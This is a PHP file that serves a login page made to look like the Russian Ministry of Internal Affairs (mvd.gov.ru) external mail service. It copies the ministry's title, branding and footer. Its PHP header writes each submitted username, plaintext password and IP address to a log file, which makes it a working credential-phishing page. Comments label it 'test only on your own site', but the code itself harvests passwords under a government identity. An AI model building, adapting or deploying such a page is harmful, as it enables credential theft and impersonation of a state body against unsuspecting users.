<?php
// ТОЛЬКО ДЛЯ ТЕСТОВОГО ИСПОЛЬЗОВАНИЯ НА СОБСТВЕННОМ САЙТЕ! 
// Логирование паролей в plaintext — ОПАСНО и НЕЗАКОННО для реальных пользователей.
// Удали этот код после теста. Используй хэширование в production (password_hash()).
// Храни test_log.txt вне public_html и защити его!

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = isset($_POST['Username']) ? trim($_POST['Username']) : '';
    $password = isset($_POST['Password']) ? trim($_POST['Password']) : '';
    $skin = isset($_POST['SessionSkin']) ? trim($_POST['SessionSkin']) : '';
    
    $logEntry = date('Y-m-d H:i:s') . " | Логин: " . $username . " | Пароль: " . $password . " | Скин: " . $skin . " | IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    
    file_put_contents('test_log.txt', $logEntry, FILE_APPEND | LOCK_EX);
    
    // Простая проверка для теста (замени на реальную аутентификацию!)
    if ($username === 'admin' && $password === 'password') {
        // Успешный логин: редирект на success.html
        header('Location: success.html');
        exit;
    } else {
        // Неудачный: показываем ошибку (или редирект на error.html)
        echo "<script>alert('Неверный логин или пароль! Для теста используй: admin / password');</script>";
    }
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru" lang="ru" dir="ltr">
<head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <title> Вход на сервер электронной почты mvd.gov.ru</title>
        <link rel="stylesheet" href="SkinFiles/mvd.gov.ru/HTML-5/style.css" type="text/css" />
  <meta http-equiv="x-dns-prefetch-control" content="off" />
</head>
<body background="SkinFiles/mvd.gov.ru/HTML-5/bodybgcolor.gif">
<form action="" method="post" enctype="multipart/form-data">
<input type="hidden" name="FormCharset" value="utf-8" />
<table width="100%" border="0" cellspacing="0" cellpadding="0">
<!-- Main Table -->
<tr><td><header class="b-header_w">
    <div class="b-header row">
        <div class="col-sm-6">
            <a href="index.html" class="b-header__logo">
                <span class="top">МВД России</span>
                <span class="bottom localize">Внешний почтовый сервис</span>
            </a>
        </div>
        <div class="col-sm-6">
            <ul class="b-header__user">
            </ul>
        </div>
    </div>
</header></td></tr>
<tr><td><table border="0" width="50%" cellspacing="2" cellpadding="0" align="center">
<tr><td colspan="2" height="25">&nbsp;</td></tr>
<tr><td colspan="2">
<!-- PAGE FORM -->
<br><br>
<div class="col-md-12">
            <div class="row">
                <div class="b-login b-box col-sm-offset-3 col-sm-6 col-xs-9">
                        <div class="row">
                            <h1 class="b-title col-sm-offset-2 col-sm-8 b-box__title"><font style="font-family: Arial Narrow;line-height: 1;">Авторизация</font></h1>
                        </div>
                        <div class="col-sm-8 col-sm-offset-2">
<div class="form-group row">
<input name="Username" type="text" size="20" placeholder="Логин" class="form-control" maxlength="255" value="" alt="Имя Пользователя" />
</div>
<div class="form-group row">
<input name="Password" type="password" size="20" placeholder="Пароль" class="form-control" maxlength="99" alt="Пароль" />
</div>
<div class="form-group row">Вид интерфейса:<br>
<select name="SessionSkin" class="form-control"><option value="*" selected="selected">по умолчанию</option><option value="">Базовый</option><option value="Stock">Stock</option><option value="Новый">Новый</option><option value="Полный">Полный</option></select>
</div>
<div class="form-group row">
<input type="submit" name="login" value="Войти" alt="Войти" class="btn btn-primary btn-block" />
</div>
                        </div>
                </div>
            </div>
        </div>
<!-- END OF PAGE FORM -->
</td></tr>
</table></td></tr>
<!-- End Main Table -->
<tr><td><!-- Hidden -->
<input type="hidden" name="Skin" value="HTML-5" />
</td></tr><!-- End of Hidden -->
<tr><td height="20">&nbsp;</td></tr>
<tr><td><footer class="b-footer_w">
    <div id="footer">
        <div id="footerWrapper">
            <div class="footer-copyright" align="center" >&copy; Министерство внутренних дел Российской Федерации, <script>document.write(new Date().getFullYear())</script></div>
        </div>
    </div>
</footer></td></tr>
</table>
</form>
</body>
</html>
